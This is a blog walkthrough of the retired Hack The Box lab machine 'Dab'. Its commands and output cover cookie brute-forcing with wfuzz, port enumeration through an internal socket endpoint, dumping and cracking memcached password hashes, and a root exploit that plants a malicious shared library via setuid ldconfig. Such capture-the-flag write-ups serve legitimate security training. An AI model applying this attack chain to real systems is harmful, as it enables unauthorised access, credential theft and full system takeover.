---
layout: post
title: "Dab: Hack The Box Walkthrough"
date: 2019-02-03 17:32:58 +0000
last_modified_at: 2019-02-03 17:34:49 +0000
category: Walkthrough
tags: ["Hack The Box", Dab, retired]
comments: true
image:
  feature: dab-htb-walkthrough.jpg
  credit: Ben_Kerckx / Pixabay
  creditlink: https://pixabay.com/en/boy-people-child-costume-dab-2223087/
---

This post documents the complete walkthrough of Dab, a retired vulnerable [VM][1] created by [snowscan][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Dab is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.86
...
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            8803 Mar 26  2018 dab.jpg
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.13.52
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:05:77:1e:73:66:bb:1e:7d:46:0f:65:50:2c:f9:0e (RSA)
|   256 61:ae:15:23:fc:bc:bc:29:13:06:f2:10:e0:0e:da:a0 (ECDSA)
|_  256 2d:35:96:4c:5e:dd:5c:c0:63:f0:dc:86:f1:b1:76:b5 (ED25519)
80/tcp   open  http    syn-ack ttl 63 nginx 1.10.3 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: nginx/1.10.3 (Ubuntu)
| http-title: Login
|_Requested resource was http://10.10.10.86/login
8080/tcp open  http    syn-ack ttl 63 nginx 1.10.3 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Internal Dev
```

`nmap` finds `21/tcp`, `22/tcp`, `80/tcp` and `8080/tcp` open. Let's start with the `ftp` service since I can login anonymously.

Well, there's nothing in `ftp` except for an image.


{% include image.html image_alt="5598951f.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/5598951f.png" %}


This is how the image looks like. Duh!


{% include image.html image_alt="e0f85be5.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/e0f85be5.png" %}


### Directory/File Enumeration

Time to move on to the `http` services, starting with `80/tcp`.


{% include image.html image_alt="123ed84f.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/123ed84f.png" %}


Bummer. I'm not going to brute-force something I have no knowledge of. `8080/tcp` is next.


{% include image.html image_alt="83abd8cf.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/83abd8cf.png" %}


This is easier to brute-force. At least I know that I need to introduce a `password` cookie. :laughing:

`wfuzz` is the perfect tool for such a job.

```
# wfuzz -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -t 20 -b "password=FUZZ" --hs incorrect http://10.10.10.86:8080
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.86:8080/
Total requests: 1000

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000211:  C=200     21 L	      48 W	    540 Ch	  "secret"
000852:  C=200     14 L	      29 W	    324 Ch	  "love11"^C
Finishing pending requests...
```

The value for the `password` cookie is `secret`. This is how the site looks like after inserting the `password` cookie.


{% include image.html image_alt="2cba17c0.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/2cba17c0.png" %}


### Memcached

Using this page, I was able to enumerate a further local service listening at `11211/tcp`: `memcached`. It's easy. Any non-listening port will result in a respode code of `500` (INTERAL SERVER ERROR). Again, we'll use `wfuzz` for such a job. The file `ports.txt` contains integers from 1 to 65535.

```
# wfuzz -w ports.txt -t 20 -b "password=secret" --hc 500 "http://10.10.10.86:8080/socket?port=FUZZ&cmd=hi"
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.86:8080/socket?port=FUZZ&cmd=hi
Total requests: 65535

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000021:  C=200     28 L	      61 W	    627 Ch	  "21"
000022:  C=200     28 L	      55 W	    629 Ch	  "22"
000080:  C=200     40 L	      84 W	   1010 Ch	  "80"
008080:  C=200     40 L	      84 W	   1010 Ch	  "8080"
011211:  C=200     27 L	      52 W	    576 Ch	  "11211"

Total time: 951.6016
Processed Requests: 65535
Filtered Requests: 65529
Requests/sec.: 68.86810

```

According to [Wikipedia](https://en.wikipedia.org/wiki/Memcached),

> Memcached (pronunciation: mem-cashed, mem-cash-dee) is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read.

To that end, I wrote a script to extract information from `memcached`, using `curl` as the driver.

<div class="filename"><span>memcache.sh</span></div>

```bash
#!/bin/bash

RHOST=10.10.10.86
RPORT=8080
MPORT=11211
CMD="$@"

curl -s \
     -b "password=secret" \
     "http://$RHOST:$RPORT/socket?port=$MPORT&cmd=$CMD" \
| sed '/<pre>/,/<\/pre>/!d' \
| sed -e '1d' -e '$d'
```

Using the `memcached` command `stats slabs`, I was able to enumerate the slabs storing the keys in memory.

```
# ./memcache.sh stats slabs
STAT 16:chunk_size 2904
STAT 16:chunks_per_page 361
STAT 16:total_pages 1
STAT 16:total_chunks 361
STAT 16:used_chunks 1
STAT 16:free_chunks 360
STAT 16:free_chunks_end 0
STAT 16:mem_requested 2880
STAT 16:get_hits 0
STAT 16:cmd_set 8
STAT 16:delete_hits 0
STAT 16:incr_hits 0
STAT 16:decr_hits 0
STAT 16:cas_hits 0
STAT 16:cas_badval 0
STAT 16:touch_hits 0
STAT 26:chunk_size 27120
STAT 26:chunks_per_page 38
STAT 26:total_pages 1
STAT 26:total_chunks 38
STAT 26:used_chunks 1
STAT 26:free_chunks 37
STAT 26:free_chunks_end 0
STAT 26:mem_requested 24699
STAT 26:get_hits 245025
STAT 26:cmd_set 455
STAT 26:delete_hits 0
STAT 26:incr_hits 0
STAT 26:decr_hits 0
STAT 26:cas_hits 0
STAT 26:cas_badval 0
STAT 26:touch_hits 0
STAT active_slabs 2
STAT total_malloced 2078904
END
```

And, using the command `stats cachedump <slab_id> 0`, I can enumerate all the keys stored in the slab.

_Slab 16_

```
# ./memcache.sh stats cachedump 16 0
ITEM stock [2807 b; 1544660622 s]
END
```

_Slab 26_

```
# ./memcache.sh stats cachedump 26 0
ITEM users [24625 b; 1544667379 s]
END
```

The `users` key caught my eye immediately.


{% include image.html image_alt="678f22ca.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/678f22ca.png" %}


The response was a hash map of username as key and the MD5 hash of the password as value. Cool, now I can transform the output as an input compatible for John the Ripper cracking.

```
./memcache.sh get users | sed '2!d' > users.txt && sed -e 's/&#34;//g' -e 's/[{}]//g' -e 's/ //g' -e 's/,/\n/g' users.txt > hashes.txt
```

The transformed output should look like this.

```
quinton_dach:17906b445a05dc42f78ae86a92a57bbd
jackie.abbott:c6ab361604c4691f78958d6289910d21
isidro:e4a4c90483d2ef61de42af1f044087f3
roy:afbde995441e19497fe0695e9c539266
colleen:d3792794c3143f7e04fd57dc8b085cd4
harrison.hessel:bc5f9b43a0336253ff947a4f8dbdb74f
asa.christiansen:d7505316e9a10fc113126f808663b5a4
jessie:71f08b45555acc5259bcefa3af63f4e1
milton_hintz:8f61be2ebfc66a5f2496bbf849c89b84
demario_homenick:2c22da161f085a9aba62b9bbedbd4ca7
...
```

Here's the fruits of the JtR labor.

```
# /opt/john/john --format=raw-md5 --show hashes.txt
aglae:misfits
alec:blaster
ona:monkeyman
wendell:megadeth
admin:Password1
demo:demo
genevieve:Princess1
abbigail:piggy
rick:lovesucks1
default:default
d_murphy:hacktheplanet
irma:strength

12 password hashes cracked, 483 left
```

## Low-Privilege Shell

Using `hydra` to validate the credentials, you'll discover that the credential (`genevieve:Princess1`) works for both `ftp` and `ssh`.


{% include image.html image_alt="e5519558.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/e5519558.png" %}


There you have it. While we are here, `user.txt` is located at `genevieve`'s home directory.


{% include image.html image_alt="32ff2a2d.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/32ff2a2d.png" %}


## Privilege Escalation

The path to privilege escalation is not hard to find; it's the way to do it that's harder.


{% include image.html image_alt="c1cdfc4b.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/c1cdfc4b.png" %}


You can see that `/usr/bin/myexec` is `setuid` to `root`. Running it reveals a login prompt, which isn't difficult to bypass. Just run it with `ltrace` and the password is shown, like so:


{% include image.html image_alt="78c493bc.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/78c493bc.png" %}


Running `ltrace` again with the correct password reveals another important clue.


{% include image.html image_alt="cf425ce9.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/cf425ce9.png" %}


Running `ldd` reveals the use of a dynamic shared object or library.


{% include image.html image_alt="1496d8c9.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/1496d8c9.png" %}


Earlier on, I notice that `ldconfig` and `ldconf.real` are also `setuid` to `root`. Pivoting on that, I found a special place to put our own shared object to bypass the original `seclogin()` function to do something more malevolent. I also discover a `cron` job that deletes files created within two minutes in `/tmp` at every minute. The window of opportunity is one minute. We need to act fast!


{% include image.html image_alt="d89a711d.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/d89a711d.png" %}


With that in mind, let's go about creating our own shared object with the following code:

<div class="filename"><span>seclogin.c</span></div>

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void seclogin() {
  setuid(0);
  setgid(0);
  puts("Spawning shell...");
  system("/bin/bash");
}
```

Compile the code to a shared object like so.

```
$ gcc -Wall -fPIC -shared -o libseclogin.so seclogin.c
```

Then run the following command.

```
cp libseclogin.so /tmp; ldconfig; myexec
```

Boom. We have a `root` shell.


{% include image.html image_alt="0acf598a.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/0acf598a.png" %}


### Root Dance

Getting `root.txt` is trivial with a `root` shell.


{% include image.html image_alt="a213f581.png" image_src="/cf03319f-a3c7-48c7-bf76-211a3be4935e/a213f581.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/150
[2]: https://www.hackthebox.eu/home/users/profile/9267
[3]: https://www.hackthebox.eu/
